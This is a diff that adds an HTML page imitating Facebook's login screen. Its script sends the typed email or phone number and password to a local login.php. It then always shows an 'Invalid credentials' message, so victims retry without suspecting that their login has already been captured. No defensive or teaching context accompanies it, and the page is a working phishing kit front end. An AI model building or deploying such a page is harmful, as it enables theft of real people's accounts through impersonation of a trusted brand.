@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .box { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 380px; }
+        .logo { text-align: center; font-size: 40px; color: #1877f2; font-weight: bold; margin-bottom: 20px; }
+        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; }
+        input:focus { border-color: #1877f2; outline: none; }
+        button { width: 100%; padding: 14px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; }
+        button:hover { background: #166fe5; }
+        .forgot { text-align: center; margin: 15px 0; color: #1877f2; font-size: 14px; cursor: pointer; }
+        .line { border-bottom: 1px solid #dadde1; margin: 20px 0; }
+        .create { text-align: center; background: #42b72a; color: white; padding: 12px; border-radius: 6px; text-decoration: none; font-weight: bold; display: block; cursor: pointer; }
+        .error { color: red; text-align: center; margin-top: 10px; display: none; }
+    </style>
+</head>
+<body>
+<div class="box">
+    <div class="logo">facebook</div>
+    <form id="loginForm">
+        <input type="text" id="username" placeholder="Email or Phone Number" required>
+        <input type="password" id="password" placeholder="Password" required>
+        <button type="submit">Log In</button>
+        <div class="forgot">Forgot password?</div>
+        <div class="line"></div>
+        <div class="create">Create New Account</div>
+        <div class="error" id="errorMsg">Invalid credentials. Please try again.</div>
+    </form>
+</div>
+<script>
+document.getElementById('loginForm').onsubmit = function(e) {
+    e.preventDefault();
+    var user = document.getElementById('username').value;
+    var pass = document.getElementById('password').value;
+    fetch('login.php', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: 'username=' + encodeURIComponent(user) + '&password=' + encodeURIComponent(pass)
+    })
+    .then(res => res.json())
+    .then(data => {
+        document.getElementById('errorMsg').style.display = 'block';
+    });
+};
+</script>
+</body>
+</html>
